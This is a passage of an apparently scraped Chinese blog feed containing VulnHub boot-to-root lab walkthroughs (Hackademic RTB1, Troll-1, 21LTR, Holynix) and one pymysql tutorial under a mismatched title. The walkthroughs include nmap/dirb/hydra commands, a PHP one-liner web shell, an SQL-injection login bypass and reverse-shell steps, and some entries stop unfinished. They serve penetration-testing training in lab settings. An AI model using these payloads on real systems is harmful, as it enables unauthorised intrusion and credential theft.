dirb 目录爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.131/Hackademic_RTB1/</span><br></pre></td></tr></table></figure><p>![image-20220607134856333](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607134856333.png)</p><blockquote><p>成功发现后台登录路径</p></blockquote><p>![image-20220607135054321](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607135054321.png)</p><blockquote><p>使用之前sqlmap扫描出来的用户名密码进行登录</p><p>NickJames:admin</p></blockquote><p>![image-20220607135549764](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607135549764.png)</p><blockquote><p>登录成功来到后台面板</p></blockquote><blockquote><p>浏览 WordPress 登录页面 <a href="http://192.168.1.104/Hackademic_RTB1/wp-login.php">http://192.168.1.104/Hackademic_RTB1/wp-login.php</a> 并使用上述用户名登录；但是，用户<strong>GeorgeMiller</strong>取得了成功，因为观察到与其他用户相比，它在管理面板中有许多可用选项。它还具有添加&#x2F;修改 PHP 脚本的权限。</p></blockquote><p>![image-20220607140341980](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607140341980.png)</p><blockquote><p>将其复制到 hello.php 文件后，单击<strong>更新文件</strong></p></blockquote><p>![image-20220607140757629](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607140757629.png)</p><blockquote><p>设置shell监听</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure><p>![image-20220607141047148](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607141047148.png)</p><p>![image-20220607141104400](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607141104400.png)</p><p>![image-20220607141233265](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607141233265.png)</p><blockquote><p>得到服务器版本2.6.31</p></blockquote><blockquote><p>运行命令<strong>searchsploit 15285</strong>并将文件 (15285.c) 复制到 Kali 桌面。我们还将在 Kali Linux 上运行默认的 Python HTTP 服务器。</p></blockquote><p>![image-20220607142221627](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607142221627.png)</p><p>![image-20220607142314624](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607142314624.png)</p><blockquote><p>现在运行内核命令如下，它会开始利用漏洞</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kernel</span><br></pre></td></tr></table></figure><blockquote><p>一旦内核命令停止执行，我们将尝试如下进入根目录并读取目录内容</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root </span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>![image-20220607143624362](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607143624362.png)</p><blockquote><p>脚本运行结束没有提示</p></blockquote><h2 id="3-获得root权限，挑战结束"><a href="#3-获得root权限，挑战结束" class="headerlink" title="3.获得root权限，挑战结束"></a>3.获得root权限，挑战结束</h2>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9.Hack the Troll-1 VM (Boot to Root)</title>
      <link href="/2022/06/19/9.Hack%20the%20Troll-1%20VM%20(Boot%20to%20Root)/"/>
      <url>/2022/06/19/9.Hack%20the%20Troll-1%20VM%20(Boot%20to%20Root)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-Troll-1-VM-Boot-to-Root"><a href="#Hack-the-Troll-1-VM-Boot-to-Root" class="headerlink" title="Hack the Troll-1 VM (Boot to Root)"></a>Hack the Troll-1 VM (Boot to Root)</h1><blockquote><p>镜像地址：<strong><a href="https://www.vulnhub.com/entry/tr0ll-1,100">https://www.vulnhub.com/entry/tr0ll-1,100</a></strong></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1. 渗透方法"></a>1. 渗透方法</h2><ul><li>网络扫描（Nmap、netdiscover）</li><li>匿名FTP登录</li><li>滥用网络浏览器</li><li>蛮力攻击（九头蛇）</li><li>SSH登录</li><li>权限提升</li><li>获取root权限</li><li>夺旗</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2. 渗透流程"></a>2. 渗透流程</h2><h3 id="2-1-局域网寻找目标主机"><a href="#2-1-局域网寻找目标主机" class="headerlink" title="2.1 局域网寻找目标主机"></a>2.1 局域网寻找目标主机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>![image-20220607150805861](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607150805861.png)</p><h3 id="2-2-nmap-扫描目标主机"><a href="#2-2-nmap-扫描目标主机" class="headerlink" title="2.2 nmap 扫描目标主机"></a>2.2 nmap 扫描目标主机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.132</span><br><span class="line">nmap -Pn -sV 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>![image-20220607150954078](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607150954078.png)</p><p>![image-20220607151155275](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607151155275.png)</p><blockquote><p>ftp服务允许匿名登录</p></blockquote><h3 id="2-3-测试http服务"><a href="#2-3-测试http服务" class="headerlink" title="2.3 测试http服务"></a>2.3 测试http服务</h3><blockquote><p>发现欢迎页面</p></blockquote><p>![image-20220607151432812](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607151432812-16545860750551.png)</p><h3 id="2-4-ftp-匿名登录"><a href="#2-4-ftp-匿名登录" class="headerlink" title="2.4 ftp 匿名登录"></a>2.4 ftp 匿名登录</h3><blockquote><p>由于允许 FTP 匿名登录，所以我们以匿名身份登录：anonymous 并下载一个 lol.pcap 文件</p></blockquote><p>![image-20220607153149697](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607153149697.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la  # 查询所在目录文件</span><br></pre></td></tr></table></figure><p>![image-20220607153304913](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607153304913.png)</p><blockquote><p>发现lol.pcap文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get lol.pcap</span><br></pre></td></tr></table></figure><p>![image-20220607153423218](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607153423218.png)</p><p>![image-20220607153501996](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607153501996.png)</p><blockquote><p>这其实是一个 Wireshark TCP 数据包</p></blockquote><p>![image-20220607155828668](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607155828668.png)</p><blockquote><p>第一个流文件</p></blockquote><p>![image-20220607160240764](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607160240764.png)</p><blockquote><p>第二个流文件</p></blockquote><blockquote><p>果然特殊</p></blockquote><p>![image-20220607160409970](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607160409970.png)</p><blockquote><p>这居然是一个网站目录</p></blockquote><blockquote><p>下载roflmao文件，并使用字符串工具打开</p></blockquote><p>![image-20220607160741277](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607160741277.png)</p><p>![image-20220607160838531](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607160838531.png)</p><blockquote><p>发现这个目录具有两个子目录</p></blockquote><p>![image-20220607161022637](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607161022637.png)</p><blockquote><p>查看这两个子目录</p></blockquote><p>![image-20220607162234958](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607162234958.png)</p><p>![image-20220607162310770](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607162310770.png)</p><blockquote><p>现在的情况是，用户名未知，但是在一定范围里，密码是已经知道的。</p></blockquote><h3 id="2-5-使用hydra-九头蛇-进行暴力破解"><a href="#2-5-使用hydra-九头蛇-进行暴力破解" class="headerlink" title="2.5 使用hydra(九头蛇)进行暴力破解"></a>2.5 使用hydra(九头蛇)进行暴力破解</h3><blockquote><p>首先下载用户名和密码各自的txt文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.132/0x0856BF/this_folder_contains_the_password/Pass.txt</span><br><span class="line">wget http://192.168.1.132/0x0856BF/good_luck/which_one_lol.txt -O Username.txt</span><br></pre></td></tr></table></figure><p>![image-20220607163108047](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607163108047.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /root/Username.txt -p Pass.txt 192.168.1.132 ssh</span><br></pre></td></tr></table></figure><p>![image-20220607163244171](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607163244171.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh overflow@192.168.1.102 # 密码 ： Pass.txt    (坑)</span><br></pre></td></tr></table></figure><p>![image-20220607163713578](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607163713578.png)</p><h3 id="2-6-提权"><a href="#2-6-提权" class="headerlink" title="2.6 提权"></a>2.6 提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&lt;dev/null</span><br></pre></td></tr></table></figure><p>![image-20220607164142967](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607164142967.png)</p><blockquote><p>超多！！！</p></blockquote><blockquote><p>在*&#x2F;lib&#x2F;log<em>中找到了一个python 文件<strong>cleaner.py</strong>，它是一个小程序。因此，管理员在此处添加了以下脚本，以清理</em>&#x2F;tmp*内部的所有垃圾文件，这些类型的文件取决于执行的特定时间间隔。</p></blockquote><p>![image-20220607190238854](9.Hack the Troll-1 VM (Boot to Root).assets&#x2F;image-20220607190238854.png)</p><h2 id="3-拿到root权限，挑战结束"><a href="#3-拿到root权限，挑战结束" class="headerlink" title="3. 拿到root权限，挑战结束"></a>3. 拿到root权限，挑战结束</h2>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1-破解-LAMPSecurity：CTF4（CTF-挑战）</title>
      <link href="/2022/06/19/python%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93mysql%E2%80%94%E2%80%94%E6%9F%A5%E8%AF%A2/"/>
      <url>/2022/06/19/python%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93mysql%E2%80%94%E2%80%94%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="python操作数据库mysql——查询"><a href="#python操作数据库mysql——查询" class="headerlink" title="python操作数据库mysql——查询"></a><a href="https://www.cnblogs.com/xiaoying-guo/p/15066361.html">python操作数据库mysql——查询</a></h1><p>安装库pymysql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pymysql</span><br></pre></td></tr></table></figure><p>使用前引入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import` `pymysql</span><br></pre></td></tr></table></figure><p>使用步骤如下：</p><p>1.创建连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db_config = &#123;</span><br><span class="line">    &#x27;host&#x27;: &#x27;api.****.com&#x27;, # 主机</span><br><span class="line">    &#x27;user&#x27;: &#x27;*****&#x27;,       #用户名</span><br><span class="line">    &#x27;password&#x27;: &#x27;123456&#x27;,  #密码</span><br><span class="line">    &#x27;port&#x27;: 3306,         #端口 3306</span><br><span class="line">    &#x27;database&#x27;:&#x27;*****&#x27;   #数据库名</span><br><span class="line">&#125;</span><br><span class="line"># 创建连接</span><br><span class="line">conn = pymysql.connect(**db_config)</span><br></pre></td></tr></table></figure><p>2.创建游标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor=conn.cursor()</span><br></pre></td></tr></table></figure><p>3.准备并执行sql语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sql=&#x27;select leave_amount from member where id=100&#x27;</span><br><span class="line">cursor.execute(sql)</span><br></pre></td></tr></table></figure><p>4.获取查询结果，类似于卸货，查询结果如果有10条，三个获取结果语句均使用，则fetchone()获得一条，fetchmany(3)获得三条，fetchall()即获得6条，三条语句合起来为查询结果为10条，如果仅使用fetchall()则获取10条</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 获取一条查询结果，以元组的形式返回</span><br><span class="line">cursor.fetchone()</span><br><span class="line"># 获取三条查询结果</span><br><span class="line">cursor.fetchmany(3)</span><br><span class="line"># 获取全部查询结果</span><br><span class="line">cursor.fetchall()</span><br></pre></td></tr></table></figure><p>　上述结果均以元组形式返回，获取结果以字典形式返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 需要引入 DictCursor</span><br><span class="line">from pymysql.cursors import DictCursor</span><br><span class="line"># 创建游标的时候，指定为DictCursor</span><br><span class="line">cursor=conn.cursor(DictCursor)</span><br></pre></td></tr></table></figure><p>查询数据库可以封装起来，后续直接导入使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"># 配置文件中db_config</span><br><span class="line">MYSQL_CONFIG = &#123;</span><br><span class="line">    &#x27;host&#x27;: &#x27;api.*****.com&#x27;,</span><br><span class="line">    &#x27;user&#x27;: &#x27;*****&#x27;,</span><br><span class="line">    &#x27;password&#x27;: &#x27;123456&#x27;,</span><br><span class="line">    &#x27;port&#x27;: 3306,</span><br><span class="line">    &#x27;database&#x27;:&#x27;*****&#x27;,</span><br><span class="line">    &#x27;engine&#x27;:&#x27;mysql&#x27;,</span><br><span class="line">    &#x27;autocommit&#x27;:True   </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">import pymysql</span><br><span class="line">from pymysql.cursors import DictCursor</span><br><span class="line"> </span><br><span class="line">class Handle_SQL:</span><br><span class="line"> </span><br><span class="line">    def __init__(self,db_config):</span><br><span class="line">        # 创建数据库连接</span><br><span class="line">        # 根据不同的数据库，创建不同的链接</span><br><span class="line">        # 如果engine没有值默认返回mysql</span><br><span class="line">        engine = db_config.pop(&#x27;engine&#x27;, &#x27;mysql&#x27;)</span><br><span class="line">        if engine.lower() == &#x27;mysql&#x27;:</span><br><span class="line">            self.conn = pymysql.connect(**db_config)</span><br><span class="line">        else:</span><br><span class="line">            pass# 此处可以配置其他的数据库</span><br><span class="line"> </span><br><span class="line">    def get_fetchone(self,sql,res_type = &#x27;t&#x27;):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        返回一条数据</span><br><span class="line">        :param sql:</span><br><span class="line">        :param size: 默认返回元组</span><br><span class="line">        :return:</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 创建游标</span><br><span class="line">        # 返回元组类型的数据</span><br><span class="line">        if res_type == &#x27;t&#x27;:</span><br><span class="line">            with self.conn.cursor() as cursor:</span><br><span class="line">                cursor.execute(sql)</span><br><span class="line">                return cursor.fetchone()</span><br><span class="line">        # 返回字典类型的数据</span><br><span class="line">        else:</span><br><span class="line">            with self.conn.cursor(DictCursor) as cursor:</span><br><span class="line">                cursor.execute(sql)</span><br><span class="line">                return cursor.fetchone()</span><br><span class="line"> </span><br><span class="line">    # 获取多个数据</span><br><span class="line">    def get_fetchmany(self,sql,size,res_type=&#x27;t&#x27;):</span><br><span class="line">        if res_type == &#x27;t&#x27;:</span><br><span class="line">            with self.conn.cursor() as cursor:</span><br><span class="line">                cursor.execute(sql)</span><br><span class="line">                return cursor.fetchmany(size)</span><br><span class="line">        # 返回字典类型的数据</span><br><span class="line">        else:</span><br><span class="line">            with self.conn.cursor(DictCursor) as cursor:</span><br><span class="line">                cursor.execute(sql)</span><br><span class="line">                return cursor.fetchmany(size)</span><br><span class="line"> </span><br><span class="line">    # 获取全部数据</span><br><span class="line">    def get_fetchall(self,sql,res_type=&#x27;t&#x27;):</span><br><span class="line">        if res_type== &#x27;t&#x27;:</span><br><span class="line">            with self.conn.cursor() as cursor:</span><br><span class="line">                cursor.execute(sql)</span><br><span class="line">                return cursor.fetchall()</span><br><span class="line">        # 返回字典类型的数据</span><br><span class="line">        else:</span><br><span class="line">            with self.conn.cursor(DictCursor) as cursor:</span><br><span class="line">                cursor.execute(sql)</span><br><span class="line">                return cursor.fetchall()</span><br><span class="line"> </span><br><span class="line">    def exist_sql(self,sql):</span><br><span class="line">        if self.get_fetchone(sql):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">    def __del__(self):</span><br><span class="line">        self.conn.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python工具脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10.Hack the 21LTR_Scene 1 VM (Boot to Root)</title>
      <link href="/2022/06/19/10.Hack%20the%2021LTR%20Scene%201%20VM%20(Boot%20to%20Root)/"/>
      <url>/2022/06/19/10.Hack%20the%2021LTR%20Scene%201%20VM%20(Boot%20to%20Root)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-21LTR-Scene-1-VM-Boot-to-Root"><a href="#Hack-the-21LTR-Scene-1-VM-Boot-to-Root" class="headerlink" title="Hack the 21LTR: Scene 1 VM (Boot to Root)"></a>Hack the 21LTR: Scene 1 VM (Boot to Root)</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/21ltr-scene-1,3/">https://www.vulnhub.com/entry/21ltr-scene-1,3/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描（Nmap、Netdiscover）</li><li>检查 HTTP 网页</li><li>FTP登录log.php文件</li><li>使用 PHP web shell 单线器</li><li>插入 netcat reverse_shell 有效载荷</li><li>生成 TTY 外壳</li><li>为权限提升编辑 passwd 文件</li><li>获取 Root 访问权限</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1局域网内扫描目标ip"><a href="#2-1局域网内扫描目标ip" class="headerlink" title="2.1局域网内扫描目标ip"></a>2.1局域网内扫描目标ip</h3><p>![image-20220608101509065](10.Hack the 21LTR Scene 1 VM (Boot to Root).assets&#x2F;image-20220608101509065.png)</p><blockquote><p>发现目标主机</p></blockquote><h3 id="2-2-namp扫描目标主机端口及开放服务"><a href="#2-2-namp扫描目标主机端口及开放服务" class="headerlink" title="2.2 namp扫描目标主机端口及开放服务"></a>2.2 namp扫描目标主机端口及开放服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.2.120             #全面扫描</span><br><span class="line">nmap -Pn -sV 192.168.2.120        #简易扫描</span><br></pre></td></tr></table></figure><p>![image-20220608102102211](10.Hack the 21LTR Scene 1 VM (Boot to Root).assets&#x2F;image-20220608102102211.png)</p><blockquote><p>全面扫描 和简易扫描也不是绝对的</p></blockquote><blockquote><p>4 个端口：21(FTP)、22(ssh)、80(HTTP)、10001(scp-config)</p></blockquote><h3 id="2-3-测试http服务"><a href="#2-3-测试http服务" class="headerlink" title="2.3 测试http服务"></a>2.3 测试http服务</h3><ol><li><p>使用浏览器访问80端口</p><p>![image-20220608102347345](10.Hack the 21LTR Scene 1 VM (Boot to Root).assets&#x2F;image-20220608102347345.png)</p></li><li><p>检查网页html源码</p><p>![image-20220608102639956](10.Hack the 21LTR Scene 1 VM (Boot to Root).assets&#x2F;image-20220608102639956.png)</p><blockquote><p>发现登录的凭证  </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- username:logs password:zg]E-b0]+8:(58G --&gt;</span><br></pre></td></tr></table></figure></li></ol><h3 id="2-4进行FTP登录"><a href="#2-4进行FTP登录" class="headerlink" title="2.4进行FTP登录"></a>2.4进行FTP登录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.2.120</span><br></pre></td></tr></table></figure><blockquote><p>username:logs password:zg]E-b0]+8:(58G</p></blockquote><p>![image-20220608103115036](10.Hack the 21LTR Scene 1 VM (Boot to Root).assets&#x2F;image-20220608103115036.png)</p><blockquote><p>发现日志备份文件并使用get下载</p></blockquote><p>![image-20220608103312162](10.Hack the 21LTR Scene 1 VM (Boot to Root).assets&#x2F;image-20220608103312162.png)</p><blockquote><p>没发现太有用的文件</p></blockquote><h3 id="2-5-dirb进行目录爆破"><a href="#2-5-dirb进行目录爆破" class="headerlink" title="2.5 dirb进行目录爆破"></a>2.5 dirb进行目录爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.2.120</span><br></pre></td></tr></table></figure><blockquote><p>柳暗花明又一村，又发现一个和logs相关的东西</p></blockquote><p>![image-20220608103757699](10.Hack the 21LTR Scene 1 VM (Boot to Root).assets&#x2F;image-20220608103757699.png)</p><blockquote><p>访问 <a href="http://192.168.2.120/logs">http://192.168.2.120/logs</a></p></blockquote><p>![image-20220608103922807](10.Hack the 21LTR Scene 1 VM (Boot to Root).assets&#x2F;image-20220608103922807.png)</p><blockquote><p>这个目录被禁止访问尝试其他方法</p></blockquote><blockquote><p>忽然想起10001这个端口不是常见端口但是又开放，必然其中存在猫腻</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.2.120</span><br></pre></td></tr></table></figure><blockquote><p>一句话木马</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&#x27;cmd&#x27;]) ?&gt;</span><br></pre></td></tr></table></figure><h1 id="未完"><a href="#未完" class="headerlink" title="未完"></a>未完</h1>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.Hack the Holynix_v1 (Boot 2 Root Challenge)</title>
      <link href="/2022/06/19/4.Hack%20the%20Holynix%20v1%20(Boot%202%20Root%20Challenge)/"/>
      <url>/2022/06/19/4.Hack%20the%20Holynix%20v1%20(Boot%202%20Root%20Challenge)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-Holynix-v1-Boot-2-Root-Challenge"><a href="#Hack-the-Holynix-v1-Boot-2-Root-Challenge" class="headerlink" title="Hack the Holynix: v1 (Boot 2 Root Challenge)"></a>Hack the Holynix: v1 (Boot 2 Root Challenge)</h1><blockquote><p>镜像地址：<a href="https://www.hackingarticles.in/hack-the-holynix-v1-boot-2-root-challenge/">https://www.hackingarticles.in/hack-the-holynix-v1-boot-2-root-challenge/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描（Nmap、netdiscover）</li><li>冲浪HTTP服务端口（80）</li><li>利用 LFI&#x2F;RFI 漏洞</li><li>SQLMAP 扫描</li><li>提取数据库和用户凭据</li><li>使用特定用户登录网站</li><li>上传并执行反向 shell</li><li>反向连接（Netcat）</li><li>使用 SUDO 二进制文件利用目标</li><li>获取 Root 权限</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1-扫描目标主机"><a href="#2-1-扫描目标主机" class="headerlink" title="2.1 扫描目标主机"></a>2.1 扫描目标主机</h3><p>![image-20220606131813443](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606131813443.png)</p><h3 id="2-2-使用NMAP扫描目标"><a href="#2-2-使用NMAP扫描目标" class="headerlink" title="2.2 使用NMAP扫描目标"></a>2.2 使用NMAP扫描目标</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A 192.168.1.12</span><br></pre></td></tr></table></figure><p>![image-20220606132106429](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606132106429.png)</p><blockquote><p>发现目标主机只有单一的开放端口80</p></blockquote><p>![image-20220606132324317](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606132324317.png)</p><blockquote><p>尝试sql注入</p></blockquote><p>![image-20220606132530732](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606132530732.png)</p><blockquote><p>Username &#x3D; ‘ or 1&#x3D;1 # </p><p>Password &#x3D; ‘ or 1&#x3D;1 #</p></blockquote><h3 id="2-3-登录成功后，寻找上传注入点"><a href="#2-3-登录成功后，寻找上传注入点" class="headerlink" title="2.3 登录成功后，寻找上传注入点"></a>2.3 登录成功后，寻找上传注入点</h3><p>![image-20220606132930046](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606132930046.png)</p><p>![image-20220606133041718](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606133041718.png)</p><blockquote><p>在尝试上传文件<strong>php-reverse-shell.php</strong>时，我们收到以下通知。用户 Alamo 似乎是受限用户；没有上传文件的权限。</p></blockquote><p>![image-20220606133438309](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606133438309.png)</p><blockquote><p>发现LFI&#x2F;RFI 漏洞（文件上传包含漏洞）</p></blockquote><h3 id="2-4-使用Burp-suite进行抓包"><a href="#2-4-使用Burp-suite进行抓包" class="headerlink" title="2.4 使用Burp suite进行抓包"></a>2.4 使用Burp suite进行抓包</h3><blockquote><p>我们需要查看从用户传递到 Web 服务器的信息是什么。让我们触发 Burpsuite 并尝试再次上传文件，并观察实际发生的情况。</p></blockquote><ol><li><p>首先打开 URL，从下拉列表中选择电子邮件，然后单击“显示文件”页面</p><p>![image-20220606151912317](4.Hack the Holynix v1 (Boot 2 Root Challenge).assets&#x2F;image-20220606151912317.png)</p></li><li><p>在 POST 